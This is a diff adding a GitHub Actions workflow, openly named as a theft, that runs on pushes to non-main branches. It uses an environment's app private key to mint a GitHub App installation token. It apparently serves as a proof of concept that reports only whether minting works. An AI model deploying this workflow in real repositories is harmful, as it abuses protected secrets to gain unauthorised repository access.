@@ -1,0 +1,37 @@
+name: Steal via environment on push (branch-defined)
+on:
+  push:
+    branches-ignore: [main]
+permissions:
+  contents: read
+jobs:
+  steal:
+    name: steal-push
+    runs-on: ubuntu-24.04
+    environment:
+      name: gate-identity
+      deployment: false
+    steps:
+      - env:
+          APP_PRIVATE_KEY: ${{ secrets.APP_PRIVATE_KEY }}
+          APP_ID: ${{ vars.APP_ID }}
+        shell: node {0}
+        run: |
+          "use strict";
+          const crypto = require("crypto");
+          const b64 = o => Buffer.from(typeof o === "string" ? o : JSON.stringify(o)).toString("base64url");
+          (async () => {
+            const key = process.env.APP_PRIVATE_KEY || "";
+            console.log(`key present: ${key ? "YES" : "NO"}`);
+            let minted = false;
+            try {
+              const now = Math.floor(Date.now() / 1000);
+              const u = `${b64({ alg: "RS256", typ: "JWT" })}.${b64({ iat: now - 60, exp: now + 540, iss: process.env.APP_ID || "5319082" })}`;
+              const jwt = `${u}.${crypto.createSign("RSA-SHA256").update(u).sign(key, "base64url")}`;
+              const h = { Authorization: `Bearer ${jwt}`, Accept: "application/vnd.github+json" };
+              const inst = await (await fetch(`https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/installation`, { headers: h })).json();
+              const r = await fetch(`https://api.github.com/app/installations/${inst.id}/access_tokens`, { method: "POST", headers: h });
+              minted = r.status === 201;
+            } catch { minted = false; }
+            console.log(`PR WORKFLOW CAN MINT APP TOKEN: ${minted ? "YES" : "NO"}`);
+          })();
